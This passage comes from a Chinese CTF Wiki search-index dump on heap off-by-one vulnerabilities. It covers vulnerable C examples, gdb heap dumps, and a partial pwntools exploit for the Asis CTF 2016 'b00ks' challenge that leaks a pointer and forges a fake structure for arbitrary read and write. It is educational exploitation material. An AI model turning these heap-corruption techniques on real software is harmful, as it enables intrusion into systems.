\u95ee\u9898\u3002 \u4f8b\u5b50 \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2015_plaidctf_datastore git: ( master ) file datastore datastore: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped \u279c 2015_plaidctf_datastore git: ( master ) checksec datastore [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled \u279c 2015_plaidctf_datastore git: ( master ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002 \u529f\u80fd\u5206\u6790 \u00b6 \u5f85\u5b8c\u6210\u3002 \u9898\u76ee \u00b6 b00ks \u00b6 \u4ecb\u7ecd \u00b6 Asis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one \u9898\u76ee\u4ecb\u7ecd \u00b6 \u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Canary : No NX : Yes PIE : Yes Fortify : No RelRO : Full \u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f struct book { int id; char *name; char *description; int size; } create \u00b6 book\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002 printf(\"\\nEnter book name size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); printf(\"Enter book name (Max 32 chars): \", &size); ptr = malloc(size); \u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002 printf(\"\\nEnter book description size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); v5 = malloc(size); \u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58 book = malloc(0x20uLL); if ( book ) { *((_DWORD *)book + 6) = size; *((_QWORD *)off_202010 + v2) = book; *((_QWORD *)book + 2) = description; *((_QWORD *)book + 1) = name; *(_DWORD *)book = ++unk_202024; return 0LL; } \u6f0f\u6d1e \u00b6 \u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002 signed __int64 __fastcall my_read(_BYTE *ptr, int number) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( number <= 0 ) return 0LL; buf = ptr; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\\n' ) break; ++buf; if ( i == number ) break; } *buf = 0; return 0LL; } \u5229\u7528 \u00b6 1.\u6cc4\u6f0f \u00b6 \u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x6161616161616161 0x6161616161616161 0x555555756050: 0x6161616161616161 0x6161616161616161 <== author name 0x555555756060: 0x0000555555757480 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6 def js(str): return io.recvuntil(str) def jsn(num): return io.recvn(num) def fs(str): io.sendline(str) def fsn(str): io.send(str) js('Enter author name:') #input author name fs('a'*32) js('>')# create book1 fs('1') js('Enter book name size:') fs('32') js('Enter book name (Max 32 chars):') fs('object1') js('Enter book description size:') fs('32') js('Enter book description:') fs('object1') js('>')# print book1 fs('4') js('Author:') js('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa') # <== leak book1 book1_addr=jsn(6) book1_addr=book1_addr.ljust(8,'\\x00') book1_addr=u64(book1_addr) 2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282 \u00b6 \u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 def off_by_one(addr): addr+=58 js('>')# create fake book in description fs('3') fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) js('Enter new book description:') fs(fake_book_data) # <== fake book js('>')# change author name fs('5') js('Enter author name:') fs('a'*32) # <== off-by-one \u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002 \u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002 3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528 \u00b6 \u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123 0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- 0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- <=== mmap 0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- 0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack] 0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar] 0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall] Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123 0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- 0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- <=== mmap 0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- 0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack] 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar] 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso] 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]","title":"\u5806\u4e2d\u7684 Off-By-One"},{"location":"pwn/heap/off_by_one/#off-by-one","text":"","title":"\u5806\u4e2d\u7684 Off-By-One"},{"location":"pwn/heap/off_by_one/#_1","text":"\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/off_by_one/#off-by-one_1","text":"off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002","title":"off-by-one \u6f0f\u6d1e\u539f\u7406"},{"location":"pwn/heap/off_by_one/#1","text":"int my_gets(char *ptr,int size) { int i; for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000","title":"\u793a\u4f8b1"},{"location":"pwn/heap/off_by_one/#2","text":"\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 '\\x00' \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 '\\x00' \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400 \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41","title":"\u793a\u4f8b2"},{"location":"pwn/heap/off_by_one/#_2","text":"\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/heap/off_by_one/#_3","text":"\u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 off-by-one\u3002","title":"\u6ce8\u610f\u5faa\u73af\u8fb9\u754c"},{"location":"pwn/heap/off_by_one/#_4","text":"\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one \u95ee\u9898\u3002","title":"\u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c"},{"location":"pwn/heap/off_by_one/#_5","text":"","title":"\u4f8b\u5b50"},{"location":"pwn/heap/off_by_one/#_6","text":"\u279c 2015_plaidctf_datastore git: ( master ) file datastore datastore: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped \u279c 2015_plaidctf_datastore git: ( master ) checksec datastore [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled \u279c 2015_plaidctf_datastore git: ( master ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"pwn/heap/off_by_one/#_7","text":"\u5f85\u5b8c\u6210\u3002","title":"\u529f\u80fd\u5206\u6790"},{"location":"pwn/heap/off_by_one/#_8","text":"","title":"\u9898\u76ee"},{"location":"pwn/heap/off_by_one/#b00ks","text":"","title":"b00ks"},{"location":"pwn/heap/off_by_one/#_9","text":"Asis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/off_by_one/#_10","text":"\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Canary : No NX : Yes PIE : Yes Fortify : No RelRO : Full \u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f struct book { int id; char *name; char *description; int size; }","title":"\u9898\u76ee\u4ecb\u7ecd"},{"location":"pwn/heap/off_by_one/#create","text":"book\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002 printf(\"\\nEnter book name size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); printf(\"Enter book name (Max 32 chars): \", &size); ptr = malloc(size); \u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002 printf(\"\\nEnter book description size: \", *(_QWORD *)&size); __isoc99_scanf(\"%d\", &size); v5 = malloc(size); \u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58 book = malloc(0x20uLL); if ( book ) { *((_DWORD *)book + 6) = size; *((_QWORD *)off_202010 + v2) = book; *((_QWORD *)book + 2) = description; *((_QWORD *)book + 1) = name; *(_DWORD *)book = ++unk_202024; return 0LL; }","title":"create"},{"location":"pwn/heap/off_by_one/#_11","text":"\u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte 